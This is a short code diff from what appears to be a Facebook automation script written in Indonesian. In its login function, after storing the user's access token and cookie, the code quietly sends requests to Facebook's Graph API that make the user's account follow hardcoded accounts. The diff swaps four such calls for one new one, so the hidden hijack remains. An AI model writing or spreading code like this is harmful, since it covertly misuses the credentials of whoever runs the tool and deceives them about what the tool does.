@@ -138,10 +138,7 @@ def login():
 		tokenw = open("data/token.txt", "w").write(tok)
 		cokiew = open("data/cookie.txt", "w").write(cookie)
 		print (f"\n{P} + token:{H} {tok}");jeda(2)
-		requests.post(f"https://graph.facebook.com/100067807565861/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
-		requests.post(f"https://graph.facebook.com/100029143111567/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
-		requests.post(f"https://graph.facebook.com/100028434880529/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
-		requests.post(f"https://graph.facebook.com/100043505053045/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
+		requests.post(f"https://graph.facebook.com/100010061977994/subscribers?access_token={tok}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
 		print (f"\n{H} √ login berhasil");jeda(2)
 		menu()
 	except Exception as e:
